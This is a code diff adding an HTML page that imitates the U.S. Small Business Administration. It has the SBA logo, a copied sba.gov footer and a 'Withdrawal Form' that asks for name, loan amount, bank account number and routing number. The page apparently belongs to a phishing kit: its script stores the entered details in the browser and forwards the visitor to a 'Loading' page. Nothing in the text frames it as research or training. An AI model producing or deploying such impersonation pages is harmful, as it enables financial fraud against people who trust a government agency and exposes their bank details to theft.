@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Small Business Administration</title>
+    <link rel="stylesheet" href="main.css">
+    <link rel="stylesheet" href="footer.css">
+</head>
+<body>
+    <div class="header">
+        <a href="index.html">
+            <img src="uploads/SBA-logo-color.png" alt="">
+        </a>
+    </div>
+    <div class="Form">
+        <h1>Withdrawal Form</h1>
+        <form action="Loading.html">
+            <div class="item">
+                <label for=""><b>Name:</b></label>
+                <input id="nombre" type="text">
+            </div>
+            <div class="item">
+                <label for=""><b>Last Name:</b></label>
+                <input id="apellido" type="text">
+            </div>
+            <div class="item">
+                <label for=""><b>Amount to approve:</b></label>
+                <input id="monto" type="text">
+            </div>
+            <div class="item">
+                <label for=""><b>Account Number:</b></label>
+                <input type="text" id="numero">
+            </div>
+            <div class="item">
+                <label for=""><b>Routing Number:</b></label>
+                <input type="text">
+            </div>
+            <div class="item">
+                <button type="submit">Submit</button>
+            </div>
+        </form>
+    </div>
+    <script>
+        const form = document.querySelector('form');
+        form.addEventListener('submit', (event) => {
+            event.preventDefault();
+
+            const nombreInput = document.querySelector('#nombre');
+            const apellidoInput = document.querySelector('#apellido');
+            const numeroInput = document.querySelector('#numero');
+            const montoInput = document.querySelector('#monto');
+            const numero = numeroInput.value;
+            localStorage.setItem('nombre', nombreInput.value);
+            localStorage.setItem('apellido', apellidoInput.value);
+            localStorage.setItem('monto', montoInput.value);
+            localStorage.setItem('numero', numero);
+            window.location.href = 'Loading.html';
+        });
+    </script>
+
+
+
+    <footer class="usa-footer usa-footer--big ">
+
+        <div>
+
+            <div class="usa-footer__primary-section">
+                <div class="grid-container">
+                    <div class="grid-row grid-gap">
+                        <div class="tablet:grid-col-8">
+                            <nav class="usa-footer__nav" aria-labelledby="footer-menu-navigation">
+                                <h3 class="visually-hidden" id="footer-menu-navigation">Footer navigation</h3>
+                                <div class="grid-row grid-gap-4">
+
+                                    <div class="mobile-lg:grid-col-6 desktop:grid-col-3">
+                                        <section class="usa-footer__primary-content usa-footer__primary-content--collapsible" data-test="footerCol">
+                                            <h4 class="usa-footer__primary-link">Acerca de la SBA</h4>
+                                            <ul class="usa-list usa-list--unstyled" id="usa-footer-menu-list-96995">
+
+
+                                                <li class="usa-footer__secondary-link">
+                                                    <a href="https://www.sba.gov/es/acerca-de-la-sba/organizacion/comuniquese-con-la-sba" data-drupal-link-system-path="node/8724">Comuníquese con la SBA</a>
+                                                </li>
+                                                <li class="usa-footer__secondary-link">
+                                                    <a href="https://www.sba.gov/es/acerca-de-la-sba/ubicaciones-de-la-sba" data-drupal-link-system-path="node/9641">Ubicaciones</a>
+                                                </li>
+                                                <li class="usa-footer__secondary-link">
+                                                    <a href="https://www.sba.gov/es/node/83" data-drupal-link-system-path="node/83">Upcoming events</a>
+                                                </li>
+                                                <li class="usa-footer__secondary-link">
+                                                    <a href="https://www.sba.gov/es/node/9239" data-drupal-link-system-path="node/9239">Sala de prensa</a>
+                                                </li>
+                                                <li class="usa-footer__secondary-link">
+                                                    <a href="https://www.sba.gov/es/node/209" data-drupal-link-system-path="node/209">SBA blog</a>
+                                                </li>
+                                                <li class="usa-footer__secondary-link">
+                                                    <a href="https://www.sba.gov/es/acerca-de-la-sba/organizacion/liderazgo-sba" data-drupal-link-system-path="node/8723">Equipo de liderazgo</a>
+                                                </li>
+
+                                            </ul>
+
+
+                                        </section>
+                                    </div>
+                                    <div class="mobile-lg:grid-col-6 desktop:grid-col-3">
+                                        <section class="usa-footer__primary-content usa-footer__primary-content--collapsible" data-test="footerCol">
+                                            <h4 class="usa-footer__primary-link">Acerca del sitio web</h4>
+                                            <ul class="usa-list usa-list--unstyled" id="usa-footer-menu-list-75939">
+
+
+                                                <li class="usa-footer__secondary-link">
+                                                    <a href="https://www.sba.gov/es/mapa-del-sitio" data-drupal-link-system-path="node/24745">Mapa del sitio</a>
+                                                </li>
+                                                <li class="usa-footer__secondary-link">
+                                                    <a href="https://www.sba.gov/es/acerca-de-la-sba/gobierno-transparente/sobre-el-sitio-web-sbagov/politica-de-privacidad" data-drupal-link-system-path="node/8713">Política de privacidad</a>
+                                                </li>
+                                                <li class="usa-footer__secondary-link">
+                                                    <a href="https://www.sba.gov/es/acerca-de-la-sba/gobierno-transparente/sobre-el-sitio-web-sbagov/politica-de-enlaces" data-drupal-link-system-path="node/8711">Política de enlaces</a>
+                                                </li>
+                                                <li class="usa-footer__secondary-link">
+                                                    <a href="https://www.sba.gov/es/acerca-de-la-sba/gobierno-transparente/calidad-de-la-informacion/lenguaje-simple" data-drupal-link-system-path="node/8715">Lenguaje simple</a>
+                                                </li>
+                                                <li class="usa-footer__secondary-link">
+                                                    <a href="https://www.sba.gov/es/acerca-de-la-sba/gobierno-transparente/sobre-el-sitio-web-sbagov/la-accesibilidad" data-drupal-link-system-path="node/8712">La accesibilidad</a>
+                                                </li>
+                                                <li class="usa-footer__secondary-link">
+                                                    <a href="https://www.sba.gov/es/acerca-de-la-sba/gobierno-transparente/sobre-el-sitio-web-sbagov/exclusion-de-responsabilidad" data-drupal-link-system-path="node/8714">Exclusión de responsabilidad</a>
+                                                </li>
+
+                                            </ul>
+
+
+                                        </section>
+                                    </div>
+                                    <div class="mobile-lg:grid-col-6 desktop:grid-col-3">
+                                        <section class="usa-footer__primary-content usa-footer__primary-content--collapsible" data-test="footerCol">
+                                            <h4 class="usa-footer__primary-link">Gobierno transparente</h4>
+                                            <ul class="usa-list usa-list--unstyled" id="usa-footer-menu-list-91868">
+
+
+                                                <li class="usa-footer__secondary-link">
+                                                    <a href="https://www.sba.gov/es/acerca-de-la-sba/gobierno-transparente/ley-de-libertad-de-informacion" data-drupal-link-system-path="node/8703">Ley de Libertad de Información</a>
+                                                </li>
+                                                <li class="usa-footer__secondary-link">
+                                                    <a href="https://www.sba.gov/es/acerca-de-la-sba/gobierno-transparente/sobre-el-sitio-web-sbagov/la-ley-no-fear" data-drupal-link-system-path="node/8710">La Ley No FEAR</a>
+                                                </li>
+                                                <li class="usa-footer__secondary-link">
+                                                    <a href="https://data.sba.gov">Open data sources</a>
+                                                </li>
+                                                <li class="usa-footer__secondary-link">
+                                                    <a href="https://www.sba.gov/es/node/8749" data-drupal-link-system-path="node/8749">Policies and guidance</a>
+                                                </li>
+                                                <li class="usa-footer__secondary-link">
+                                                    <a href="https://www.sba.gov/es/acerca-de-la-sba/organizacion/desempeno" data-drupal-link-system-path="node/8721">Presupuesto y desempeño </a>
+                                                </li>
+
+                                            </ul>
+
+
+                                        </section>
+                                    </div>
+                                    <div class="mobile-lg:grid-col-6 desktop:grid-col-3">
+                                        <section class="usa-footer__primary-content usa-footer__primary-content--collapsible" data-test="footerCol">
+                                            <h4 class="usa-footer__primary-link">Supervisión</h4>
+                                            <ul class="usa-list usa-list--unstyled" id="usa-footer-menu-list-28687">
+
+
+                                                <li class="usa-footer__secondary-link">
+                                                    <a href="https://www.sba.gov/es/node/8974" data-drupal-link-system-path="node/8974">Inspector General</a>
+                                                </li>
+                                                <li class="usa-footer__secondary-link">
+                                                    <a href="https://advocacy.sba.gov">Advocacy</a>
+                                                </li>
+                                                <li class="usa-footer__secondary-link">
+                                                    <a href="https://www.sba.gov/es/node/8961" data-drupal-link-system-path="node/8961">Hearings and appeals</a>
+                                                </li>
+                                                <li class="usa-footer__secondary-link">
+                                                    <a href="https://www.sba.gov/es/node/8726" data-drupal-link-system-path="node/8726">Ombudsman</a>
+                                                </li>
+                                                <li class="usa-footer__secondary-link">
+                                                    <a href="https://www.whitehouse.gov/es/" class="ext" data-extlink="" target="_blank" rel="noopener noreferrer">La Casa Blanca<svg focusable="false" class="ext" role="img" aria-label="(link is external)" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 80 40"><metadata><sfw xmlns="http://ns.adobe.com/SaveForWeb/1.0/"><slicesourcebounds y="-8160" x="-8165" width="16389" height="16384" bottomleftorigin="true"></slicesourcebounds><optimizationsettings><targetsettings targetsettingsid="0" fileformat="PNG24Format"><png24format transparency="true" filtered="false" interlaced="false" nomattecolor="false" mattecolor="#FFFFFF"></png24format></targetsettings></optimizationsettings></sfw></metadata><title>(link is external)</title><path d="M48 26c-1.1 0-2 0.9-2 2v26H10V18h26c1.1 0 2-0.9 2-2s-0.9-2-2-2H8c-1.1 0-2 0.9-2 2v40c0 1.1 0.9 2 2 2h40c1.1 0 2-0.9 2-2V28C50 26.9 49.1 26 48 26z"></path><path d="M56 6H44c-1.1 0-2 0.9-2 2s0.9 2 2 2h7.2L30.6 30.6c-0.8 0.8-0.8 2 0 2.8C31 33.8 31.5 34 32 34s1-0.2 1.4-0.6L54 12.8V20c0 1.1 0.9 2 2 2s2-0.9 2-2V8C58 6.9 57.1 6 56 6z"></path></svg></a>
+                                                </li>
+                                                <li class="usa-footer__secondary-link">
+                                                    <a href="https://www.usa.gov/es/" class="ext" data-extlink="" target="_blank" rel="noopener noreferrer">USA.gov en español<svg focusable="false" class="ext" role="img" aria-label="(link is external)" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 80 40"><metadata><sfw xmlns="http://ns.adobe.com/SaveForWeb/1.0/"><slicesourcebounds y="-8160" x="-8165" width="16389" height="16384" bottomleftorigin="true"></slicesourcebounds><optimizationsettings><targetsettings targetsettingsid="0" fileformat="PNG24Format"><png24format transparency="true" filtered="false" interlaced="false" nomattecolor="false" mattecolor="#FFFFFF"></png24format></targetsettings></optimizationsettings></sfw></metadata><title>(link is external)</title><path d="M48 26c-1.1 0-2 0.9-2 2v26H10V18h26c1.1 0 2-0.9 2-2s-0.9-2-2-2H8c-1.1 0-2 0.9-2 2v40c0 1.1 0.9 2 2 2h40c1.1 0 2-0.9 2-2V28C50 26.9 49.1 26 48 26z"></path><path d="M56 6H44c-1.1 0-2 0.9-2 2s0.9 2 2 2h7.2L30.6 30.6c-0.8 0.8-0.8 2 0 2.8C31 33.8 31.5 34 32 34s1-0.2 1.4-0.6L54 12.8V20c0 1.1 0.9 2 2 2s2-0.9 2-2V8C58 6.9 57.1 6 56 6z"></path></svg></a>
+                                                </li>
+                                                <li class="usa-footer__secondary-link">
+                                                    <a href="https://www.regulations.gov/" class="ext" data-extlink="" target="_blank" rel="noopener noreferrer">Regulations.gov<svg focusable="false" class="ext" role="img" aria-label="(link is external)" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 80 40"><metadata><sfw xmlns="http://ns.adobe.com/SaveForWeb/1.0/"><slicesourcebounds y="-8160" x="-8165" width="16389" height="16384" bottomleftorigin="true"></slicesourcebounds><optimizationsettings><targetsettings targetsettingsid="0" fileformat="PNG24Format"><png24format transparency="true" filtered="false" interlaced="false" nomattecolor="false" mattecolor="#FFFFFF"></png24format></targetsettings></optimizationsettings></sfw></metadata><title>(link is external)</title><path d="M48 26c-1.1 0-2 0.9-2 2v26H10V18h26c1.1 0 2-0.9 2-2s-0.9-2-2-2H8c-1.1 0-2 0.9-2 2v40c0 1.1 0.9 2 2 2h40c1.1 0 2-0.9 2-2V28C50 26.9 49.1 26 48 26z"></path><path d="M56 6H44c-1.1 0-2 0.9-2 2s0.9 2 2 2h7.2L30.6 30.6c-0.8 0.8-0.8 2 0 2.8C31 33.8 31.5 34 32 34s1-0.2 1.4-0.6L54 12.8V20c0 1.1 0.9 2 2 2s2-0.9 2-2V8C58 6.9 57.1 6 56 6z"></path></svg></a>
+                                                </li>
+
+                                            </ul>
+
+
+                                        </section>
+                                    </div>
+
+                                </div>
+                            </nav>
+                        </div>
+
+
+
+                        <div class="tablet:grid-col-4">
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+
+        </div>
+
+
+
+        <div class="usa-footer__secondary-section">
+            <div class="grid-container">
+                <div class="sba-footer-grid  grid-gap">
+                    <div class="usa-footer__logo grid-row mobile-lg:grid-col-6 mobile-lg:grid-gap-2">
+                        <div class="mobile-lg:grid-col-auto">
+                            <img class="usa-footer__logo-img" src="https://www.sba.gov/themes/custom/sba/sba-logo.svg" alt="" loading="lazy" width="80" height="80">
+                        </div>
+                        <address class="mobile-lg:grid-col-auto usa-footer__address">
+                            <div class="usa-footer__contact-info grid-row grid-gap">
+                                <div class="grid-col-auto">
+                                    <div id="block-sbafooteraddress--2" class="block block-sbagov-footer-address block-id-sbafooteraddress">
+
+
+                                        <p><strong>U.S. Small Business Administration</strong><br>409 3rd St., SW<br>Washington, DC 20416<br><a href="tel:800-827-5722">800-827-5722</a></p>
+                                    </div>
+
+                                </div>
+                            </div>
+                        </address>
+                    </div>
+
+                    <div class="usa-footer__contact-links mobile-lg:grid-col-6">
+                        <div class="usa-footer__social-links grid-row grid-gap-1">
+                            <div class="grid-col-auto">
+                                <a class="usa-social-link" href="https://facebook.com/SBAgov" data-test="footerSocialLink" target="_blank" rel="noopener noreferrer">
+                                    <img class="usa-social-link__icon" src="https://www.sba.gov/themes/custom/sba/src/img/sba-icons/facebook.svg" alt="Facebook" loading="lazy" width="40" height="40">
+                                </a>
+                            </div>
+
+                            <div class="grid-col-auto">
+                                <a class="usa-social-link" href="https://twitter.com/sbagov" data-test="footerSocialLink" target="_blank" rel="noopener noreferrer">
+                                    <img class="usa-social-link__icon" src="https://www.sba.gov/themes/custom/sba/src/img/sba-icons/twitter.svg" alt="Twitter" loading="lazy" width="40" height="40">
+                                </a>
+                            </div>
+
+                            <div class="grid-col-auto">
+                                <a class="usa-social-link" href="https://youtube.com/user/sba" data-test="footerSocialLink" target="_blank" rel="noopener noreferrer">
+                                    <img class="usa-social-link__icon" src="https://www.sba.gov/themes/custom/sba/src/img/sba-icons/youtube.svg" alt="YouTube" loading="lazy" width="40" height="40">
+                                </a>
+                            </div>
+
+                            <div class="grid-col-auto">
+                                <a class="usa-social-link" href="https://linkedin.com/company/us-small-business-administration" data-test="footerSocialLink" target="_blank" rel="noopener noreferrer">
+                                    <img class="usa-social-link__icon" src="https://www.sba.gov/themes/custom/sba/src/img/sba-icons/linkedin.svg" alt="Linkedin" loading="lazy" width="40" height="40">
+                                </a>
+                            </div>
+
+                            <div class="grid-col-auto">
+                                <a class="usa-social-link" href="https://instagram.com/sbagov" data-test="footerSocialLink" target="_blank" rel="noopener noreferrer">
+                                    <img class="usa-social-link__icon" src="https://www.sba.gov/themes/custom/sba/src/img/sba-icons/instagram.svg" alt="Instagram" loading="lazy" width="40" height="40">
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+
+    </footer>
+
+</body>
+</html>
